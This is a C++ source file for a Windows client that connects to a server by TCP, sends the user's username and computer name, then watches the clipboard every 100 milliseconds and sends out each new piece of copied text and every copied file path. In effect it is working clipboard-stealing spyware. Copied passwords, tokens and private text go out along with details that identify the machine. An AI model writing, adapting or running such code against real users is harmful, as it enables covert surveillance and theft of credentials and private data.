#include "common.h"
#include <iostream>
#include <thread>
#include <string>
#include <Lmcons.h>
#include <windows.h>

// Function to get file information from clipboard
std::wstring ProcessFileClipboard() {
    std::wstring result;
    HDROP hDrop = (HDROP)GetClipboardData(CF_HDROP);
    if (hDrop != NULL) {
        UINT fileCount = DragQueryFile(hDrop, 0xFFFFFFFF, NULL, 0);
        
        for (UINT i = 0; i < fileCount; i++) {
            TCHAR szFile[MAX_PATH];
            if (DragQueryFile(hDrop, i, szFile, MAX_PATH)) {
                std::wstring widePath(szFile);
                result += L"File: " + widePath + L"\n";
                
                // Get file extension
                size_t dotPos = widePath.find_last_of(L".");
                if (dotPos != std::wstring::npos) {
                    std::wstring wideExt = widePath.substr(dotPos + 1);
                    result += L"Type: " + wideExt + L"\n";
                }
            }
        }
    }
    return result;
}

// Function to get text from clipboard
std::wstring ProcessTextClipboard() {
    std::wstring result;
    HANDLE hData = GetClipboardData(CF_UNICODETEXT);
    if (hData != NULL) {
        wchar_t* pszText = static_cast<wchar_t*>(GlobalLock(hData));
        if (pszText != NULL) {
            result = L"Text content: " + std::wstring(pszText);
            GlobalUnlock(hData);
        }
    }
    return result;
}

void MonitorClipboard(SOCKET sock) {
    // Previous clipboard sequence number
    DWORD lastSequence = GetClipboardSequenceNumber();
    
    while (true) {
        // Check if clipboard content has changed
        DWORD currentSequence = GetClipboardSequenceNumber();
        
        if (currentSequence != lastSequence) {
            lastSequence = currentSequence;
            
            if (OpenClipboard(NULL)) {
                Message msg = {};
                msg.type = MessageType::REGULAR;
                std::wstring clipboardContent;
                
                // Check for files
                if (IsClipboardFormatAvailable(CF_HDROP)) {
                    clipboardContent = L"Files detected in clipboard:\n" + ProcessFileClipboard();
                }
                // Check for text
                else if (IsClipboardFormatAvailable(CF_UNICODETEXT)) {
                    clipboardContent = L"Text detected in clipboard:\n" + ProcessTextClipboard();
                }
                
                if (!clipboardContent.empty()) {
                    // Convert wide string to UTF-16 bytes
                    int size_needed = WideCharToMultiByte(CP_UTF8, 0, clipboardContent.c_str(), -1, NULL, 0, NULL, NULL);
                    if (size_needed > 0 && size_needed < BUFFER_SIZE) {
                        WideCharToMultiByte(CP_UTF8, 0, clipboardContent.c_str(), -1, msg.data, BUFFER_SIZE, NULL, NULL);
                        send(sock, (char*)&msg, sizeof(Message), 0);
                    }
                }
                
                CloseClipboard();
            }
        }
        
        Sleep(100); // Check every 100ms
    }
}

int main() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "Failed to initialize Winsock" << std::endl;
        return 1;
    }

    SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (clientSocket == INVALID_SOCKET) {
        std::cerr << "Failed to create socket" << std::endl;
        WSACleanup();
        return 1;
    }

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(DEFAULT_PORT);
    inet_pton(AF_INET, "127.0.0.1", &serverAddr.sin_addr);

    if (connect(clientSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        std::cerr << "Failed to connect to server" << std::endl;
        closesocket(clientSocket);
        WSACleanup();
        return 1;
    }

    // Get username and hostname
    char username[UNLEN + 1];
    DWORD usernameLen = UNLEN + 1;
    GetUserNameA(username, &usernameLen);

    char hostname[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD hostnameLen = MAX_COMPUTERNAME_LENGTH + 1;
    GetComputerNameA(hostname, &hostnameLen);

    // Send initialization message
    Message initMsg = {};
    initMsg.type = MessageType::INIT;
    strncpy_s(initMsg.clientInfo.username, username, MAX_NAME_LENGTH - 1);
    strncpy_s(initMsg.clientInfo.hostname, hostname, MAX_NAME_LENGTH - 1);
    send(clientSocket, (char*)&initMsg, sizeof(Message), 0);

    std::cout << "Connected to server. Monitoring clipboard..." << std::endl;

    // Start clipboard monitoring in a separate thread
    std::thread clipboardThread(MonitorClipboard, clientSocket);
    clipboardThread.join();

    closesocket(clientSocket);
    WSACleanup();
    return 0;
} 